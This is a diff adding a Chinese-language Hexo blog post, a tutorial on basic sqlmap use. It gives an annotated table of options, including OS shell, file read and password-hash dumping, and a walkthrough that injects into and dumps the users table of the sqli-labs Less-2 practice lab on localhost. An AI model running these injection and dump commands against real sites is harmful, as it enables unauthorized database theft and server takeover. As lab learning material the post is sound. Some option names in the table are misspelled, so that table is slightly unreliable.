@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="yanm1ng&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      sqlmap基本使用 | Hexo
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+  
+    
+<script src="/js/local-search.js"></script>
+
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>Hexo</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/series/" class="item-link">Series</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+      
+        <li class="menu-item menu-item-search right-list">
+    <a role="button" class="popup-trigger">
+        <i class="fa fa-search fa-fw"></i>
+    </a>
+</li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/series/" class="menu-link">Series</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+    
+      <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+            <span class="search-icon">
+                <i class="fa fa-search"></i>
+            </span>
+            <div class="search-input-container">
+                <input autocomplete="off" autocapitalize="off"
+                    placeholder="Please enter your keyword(s) to search." spellcheck="false"
+                    type="search" class="search-input">
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa fa-times-circle"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+    
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>sqlmap基本使用</h2>
+  <p class="post-date">2021-11-02</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p>SQLMap 是一个开源的SQL注入工具，可以用来进行自动化检测，甚至可以利用 SQL 注入漏洞直接获取目标数据库服务器的权限。</p>
+<span id="more"></span>
+<h4 id="简介">简介</h4>
+<p>sqlmap是一款非常强大的开源sql自动化注入工具，可以用来检测和利用sql注入漏洞。它是由python语言编写而成。因此使用sqlmap时，需要在python环境中运行。</p>
+<p>SQLMap支持的五种注入方法：</p>
+<ol>
+<li>
+<p>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</p>
+</li>
+<li>
+<p>基于布尔的盲注，即可以根据返回页面判断条件真假的注入</p>
+</li>
+<li>
+<p>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断</p>
+</li>
+<li>
+<p>联合查询注入，可以使用 union 的情况下的注入</p>
+</li>
+<li>
+<p>堆查询注入，可以同时执行多条语句的执行时的注入</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br></pre></td><td class="code"><pre><span class="line">sqlmap常用命令</span><br><span class="line">-h                                            显示基本帮助信息</span><br><span class="line"></span><br><span class="line">-hh                                           显示高级帮助信息</span><br><span class="line"></span><br><span class="line">--version                                     显示版本号</span><br><span class="line"></span><br><span class="line">-v                                            详细等级（0-6 默认 1）</span><br><span class="line"></span><br><span class="line">                                              0：只显示python错误以及重要信息</span><br><span class="line"></span><br><span class="line">                                              1：显示信息以及警告</span><br><span class="line"></span><br><span class="line">                                              2：显示debug消息</span><br><span class="line"></span><br><span class="line">                                              3：显示注入payload</span><br><span class="line"></span><br><span class="line">                                              4：显示http请求</span><br><span class="line"></span><br><span class="line">                                              5：显示http响应头·</span><br><span class="line"></span><br><span class="line">                                              6：显示http响应内容</span><br><span class="line"></span><br><span class="line">Target：                                </span><br><span class="line"></span><br><span class="line">-u                                          指定目标url</span><br><span class="line"></span><br><span class="line">-d                                          直接连接数据库</span><br><span class="line"></span><br><span class="line">-l                                          从burp代理日志的解析目标</span><br><span class="line"></span><br><span class="line">-r                                          从文件中加载http请求</span><br><span class="line"></span><br><span class="line">-g                                          从google dork的结果作为目标url</span><br><span class="line"></span><br><span class="line">-c                                          从INI配置文件中加载选项</span><br><span class="line"></span><br><span class="line">Request</span><br><span class="line"></span><br><span class="line">-A                                    指定user-agent头</span><br><span class="line"></span><br><span class="line">-H                                    额外的header</span><br><span class="line"></span><br><span class="line">-method=                              指定HTTP方法（GET/POST）</span><br><span class="line"></span><br><span class="line">--data=                               通过POST提交数据    </span><br><span class="line"></span><br><span class="line">--param-del=                          指定参数分隔符</span><br><span class="line"></span><br><span class="line">--cookie=                             指定cookie的值</span><br><span class="line"></span><br><span class="line">--cookie-del=                         指定cookie分隔符</span><br><span class="line"></span><br><span class="line">--drop-set-cookie                     扔掉response中的set-cookie头</span><br><span class="line"></span><br><span class="line">--random-agent                        使用随机的user-agent头</span><br><span class="line"></span><br><span class="line">--host=                               设置host头 </span><br><span class="line"></span><br><span class="line">--referer=                            指定referer头</span><br><span class="line"></span><br><span class="line">--headers=                            额外的headers</span><br><span class="line"></span><br><span class="line">--auth-type=                          http认证类型（Basic，NTLM，Digest）</span><br><span class="line"></span><br><span class="line">--auith-cred=                         http认证凭证（账号：密码）</span><br><span class="line"></span><br><span class="line">--ignore-proxy                        忽略系统代理（常用于扫描本地文件）</span><br><span class="line"></span><br><span class="line">--proxy=                              使用代理</span><br><span class="line"></span><br><span class="line">--proxy-cred=                         代理认证证书（账号：密码）</span><br><span class="line"></span><br><span class="line">--delay=                              设置延迟时间（两个请求之间）</span><br><span class="line"></span><br><span class="line">--timeout=                            超时时来连接前等待（默认 30）</span><br><span class="line"></span><br><span class="line">--retries=                            连接超时时重试次数（默认 3）</span><br><span class="line"></span><br><span class="line">--randomize=                          随机更改指定的参数的值</span><br><span class="line"></span><br><span class="line">--safe-url=                           在测试期间经常访问的URL</span><br><span class="line"></span><br><span class="line">--safe-post=                          POST数据发送到安全的URL</span><br><span class="line"></span><br><span class="line">--safe-freq=                          两次请求之间穿插一个安全的URL   </span><br><span class="line"></span><br><span class="line">--skip-urlencode                      跳过payload数据的URL编码</span><br><span class="line"></span><br><span class="line">--chunked                             使用HTTP分块传输加密POST请求</span><br><span class="line"></span><br><span class="line">--hpp                                 使用HTTP参数pollution方法（常用于绕过IPS/IDS检测）</span><br><span class="line"></span><br><span class="line">--force-ssl                           强制使用SSL/HTTPS</span><br><span class="line"></span><br><span class="line">--eval=value                          请求之前提供Python代码（eg：&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）</span><br><span class="line"></span><br><span class="line">Optimization</span><br><span class="line"></span><br><span class="line">-o                                    打开所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output                      预测输出（与--threads不兼容）</span><br><span class="line"></span><br><span class="line">--keep-alive                          建立长久的HTTP(S)连接 (与--proxy不兼容)</span><br><span class="line"></span><br><span class="line">--null-connection                     空连接</span><br><span class="line"></span><br><span class="line">--threads=value                       设置线程(默认 1)</span><br><span class="line"></span><br><span class="line">Injection</span><br><span class="line"></span><br><span class="line">-p                                    指定测试参数</span><br><span class="line"></span><br><span class="line">--skip=                               跳过指定参数的测试</span><br><span class="line"></span><br><span class="line">--skip-static                         跳过测试静态的参数</span><br><span class="line"></span><br><span class="line">--dbms=                               指定具体DBMS</span><br><span class="line"></span><br><span class="line">--os=                                 指定DBMS操作系统</span><br><span class="line"></span><br><span class="line">--invalid-bignum                      使用大数字使值无效</span><br><span class="line"></span><br><span class="line">--invalid-logical                     使用逻辑符使值无效</span><br><span class="line"></span><br><span class="line">--invalid-string                      使用字符串使值无效</span><br><span class="line"></span><br><span class="line">--no-cast                             关闭payload铸造机制</span><br><span class="line"></span><br><span class="line">--no-escape                           关闭字符转义机制（默认自动开启）</span><br><span class="line"></span><br><span class="line">--prefix=                             加入payload前缀</span><br><span class="line"></span><br><span class="line">--suffix=                             加入payload后缀</span><br><span class="line"></span><br><span class="line">--tamper=                             指定使用的脚本</span><br><span class="line"></span><br><span class="line">Detectiong</span><br><span class="line"></span><br><span class="line">--level=                              指定测试的等级（1-5 默认为1）</span><br><span class="line"></span><br><span class="line">--risk=                               指定测试的风险（0-3 默认为1）</span><br><span class="line"></span><br><span class="line">--string=                      登录成功时，页面所含有的“关键字” 用于证明已经登录成功</span><br><span class="line"></span><br><span class="line">--not-string=                  登录成功时，页面所含有的“关键字” 用于证明已经登录失败</span><br><span class="line"></span><br><span class="line">--code=                         查询为真时，匹配的HTTP代码</span><br><span class="line"></span><br><span class="line">--smart                         当有大量检测目标时，只选择基于错误的检测结果</span><br><span class="line"></span><br><span class="line">--text-only                     仅基于文本内容比较网页</span><br><span class="line"></span><br><span class="line">--titles                        仅基于标题比较网页</span><br><span class="line"></span><br><span class="line">Techniques</span><br><span class="line"></span><br><span class="line">--technique=                    指定sql注入技术（默认BEUSTQ）</span><br><span class="line"></span><br><span class="line">--time-sec=                     基于时间注入检测相应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">--union-clos=                   进行查询时，指定列的范围</span><br><span class="line"></span><br><span class="line">--union-char=                   指定暴力破解列数的字符</span><br><span class="line"></span><br><span class="line">Fingerprint</span><br><span class="line"></span><br><span class="line">-f                              查询目标DBMS版本指纹信息</span><br><span class="line"></span><br><span class="line">Emuneration</span><br><span class="line"></span><br><span class="line">-a                              查询所有  </span><br><span class="line"></span><br><span class="line">-b                              查询目标DBMS banner信息</span><br><span class="line"></span><br><span class="line">--current-user                  查询目标DBMS当前用户</span><br><span class="line"></span><br><span class="line">--current-db                    查询目标DBMS当前数据库</span><br><span class="line"></span><br><span class="line">--is-dba                        查询目标DBMS当前用户是否为DBA</span><br><span class="line"></span><br><span class="line">--users                         枚举目标DBMS所有的用户</span><br><span class="line"></span><br><span class="line">--paswords                      枚举目标DBMS用户密码哈希值</span><br><span class="line"></span><br><span class="line">--privileges                    枚举目标DBMS用户的权限</span><br><span class="line"></span><br><span class="line">--roles                         枚举DBMS用户的角色</span><br><span class="line"></span><br><span class="line">--dbs                           枚举DBMS所有的数据库</span><br><span class="line"></span><br><span class="line">--tables                        枚举DBMS数据库中所有的表</span><br><span class="line"></span><br><span class="line">--columns                       枚举DBMS数据库表中所有的列</span><br><span class="line"></span><br><span class="line">--count                         检索表的条目的数量</span><br><span class="line"></span><br><span class="line">--dump                          存储DBMS数据库的表中的条目</span><br><span class="line"></span><br><span class="line">--dump-all                      存储DBMS所有数据库表中的条目</span><br><span class="line"></span><br><span class="line">--D db                          指定进行枚举的数据库名称</span><br><span class="line"></span><br><span class="line">--T   table                     指定进行枚举的数据库表名称</span><br><span class="line"></span><br><span class="line">--C   column                    指定进行枚举的数据库列名称</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs                枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--sql-query                     指定查询的sql语句</span><br><span class="line"></span><br><span class="line">--sql-shell                     提示输入一个交互式sql shell</span><br><span class="line"></span><br><span class="line">Brute force</span><br><span class="line"></span><br><span class="line">--common-tables                     暴力破解表 </span><br><span class="line"></span><br><span class="line">--common-colomns                    暴力破解列</span><br><span class="line"></span><br><span class="line">File system access</span><br><span class="line"></span><br><span class="line">--file-read                          从目标数据库管理文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write                         上传文件到目标数据库管理文件系统</span><br><span class="line"></span><br><span class="line">--file-dest                          指定写入文件的绝对路径</span><br><span class="line"></span><br><span class="line">--os-cmd=                            执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell                           交互式的系统shell</span><br><span class="line"></span><br><span class="line">--os-pwn                             获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay                    一键获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-bof                             储存过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--os-esc                             数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path=                        Metasploit  Framework本地安装路径</span><br><span class="line"></span><br><span class="line">General</span><br><span class="line"></span><br><span class="line">-s                                    sqlite会话文件保存位置</span><br><span class="line"></span><br><span class="line">-t                                    记录所有HTTP流量到指定文件中</span><br><span class="line"></span><br><span class="line">--batch                               测试过程中， 执行所有默认配置</span><br><span class="line"></span><br><span class="line">--charset=v                           强制用于数据检索的字符编码 </span><br><span class="line"></span><br><span class="line">--crawl=                              从目标URL开始爬取网站</span><br><span class="line"></span><br><span class="line">--crawl-exclude=                      禁止爬取某个页面（eg：logout）</span><br><span class="line"></span><br><span class="line">--csv-del=                            指定CSV输出中使用的的字符</span><br><span class="line"></span><br><span class="line">--dump-format=               储存数据的方式（CSV(default)，HTML，SQLITE）</span><br><span class="line"></span><br><span class="line">--flush-session                       刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--fresh-queries                       忽略会话文件中储存的查询结果，重新查询</span><br><span class="line"></span><br><span class="line">--hex                                 使用DBMS hex函数进行数据检索</span><br><span class="line"></span><br><span class="line">--outpout-dir=                        自定义输出目录</span><br><span class="line"></span><br><span class="line">--save=                               保存选项到INI配置文件中</span><br><span class="line"></span><br><span class="line">--scope=                              使用正则表达式从提供的日志中guo&#x27;l</span><br><span class="line"></span><br><span class="line">--alert                               再找到SQL注入时运行主机操作系统命令</span><br><span class="line"></span><br><span class="line">--purge-output                        安全的从输出目录中删除所有内容</span><br><span class="line"></span><br><span class="line">--sqlmap-shell                        提示输入交互式sqlmap  shell</span><br><span class="line"></span><br><span class="line">--update                              更新sqlmap</span><br><span class="line"></span><br><span class="line">sqlmap注入技术简介</span><br><span class="line">--technique=     （默认全部使用）</span><br><span class="line">B      基于布尔的盲注</span><br><span class="line">T      基于时间的盲注</span><br><span class="line">E      基于报错的注入</span><br><span class="line">U      基于UNION查询注入</span><br><span class="line">S      基于多语句查询注入</span><br><span class="line">————————————————</span><br><span class="line">原文链接：https://blog.csdn.net/smli_ng/article/details/106026901</span><br></pre></td></tr></table></figure>
+<h4 id="sqlmap-GET">sqlmap-GET</h4>
+<p>由于还没有完整的使用sqlmap爆库过，以下我们基于Less2进行完整的过程并整理出来。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost/sqli-labs-master/Less-2/?id=1</span><br></pre></td></tr></table></figure>
+<p>在这个过程中他会让我们选择 [Y/N] ,一般情况下我们都选择y，下面是第一过程的询问语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Do you want to skip test payloads specific for other DBMSes? [Y/n] // SQLMap检测到后台数据库可能是MySQL，询问我们是否跳过其他数据库的检测，选择Y跳过直接进行下一步</span><br><span class="line">do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] // 提示是否扫描等级为1风险为1下的所有payload，选择Y</span><br><span class="line">Do you want to keep testing the others (if any)? [y/N] // 参数ID是可以注入的，是否测试其他参数，由于本次只有一个参数，所以直接跳过即可</span><br></pre></td></tr></table></figure>
+<p>扫描结束，sqlmap为我们列举了四种可以注入的类型，分别是布尔盲注、报错注入、时间盲注和联合查询注入。</p>
+<p><img src="/2021/11/02/sqlmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/oi.png" alt></p>
+<p>下一步是查库。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost/sqli-labs-master/Less-2/?id=1 -D security --tables --batch</span><br></pre></td></tr></table></figure>
+<p>–batch：使用非交互式扫描，SQLMap将不会询问</p>
+<p><img src="/2021/11/02/sqlmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/er.png" alt></p>
+<p>查询到security数据库，下一步查表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost/sqli-labs-master/Less-2/?id=1 -D security --tables --batch</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/02/sqlmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/hg.png" alt></p>
+<p>这里可以发现没有查到，但我用手工以及在cmd都是有的，步骤是没有错的，这里初步怀疑是我的python版本比较高，不匹配，不过我们还是把步骤整理出来。</p>
+<p><strong>获取user表中所有的行</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost/sqli-labs-master/Less-2/?id=1 -D security -T users --dump --batch</span><br></pre></td></tr></table></figure>
+<p><strong>查字段值</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost/sqli-labs-master/Less-2/?id=1 -D security -T users --columns --batch</span><br></pre></td></tr></table></figure>
+<h4 id="sqlmap-POST">sqlmap-POST</h4>
+<p>用burpsuite抓包，复制到文件打开就可以了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r 文件名 --batch</span><br></pre></td></tr></table></figure>
+</section>
+    <!-- Tags START -->
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2021/11/01/sqli-labs-Less29-32/">
+        <span class="nav-arrow">← </span>
+        
+          sqli-labs-Less29-32
+        
+      </a>
+    
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Utterances START -->
+      <div id="utterances"></div>
+      <script src="https://utteranc.es/client.js"
+        repo=""
+        issue-term="pathname"
+        theme="github-light"
+        crossorigin="anonymous"
+        async></script>    
+      <!-- Utterances END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-nav-text">简介</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#sqlmap-GET"><span class="toc-nav-text">sqlmap-GET</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#sqlmap-POST"><span class="toc-nav-text">sqlmap-POST</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2021/11/02/sqlmap基本使用/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', '/css/images/error_icon.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== '/css/images/error_icon.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
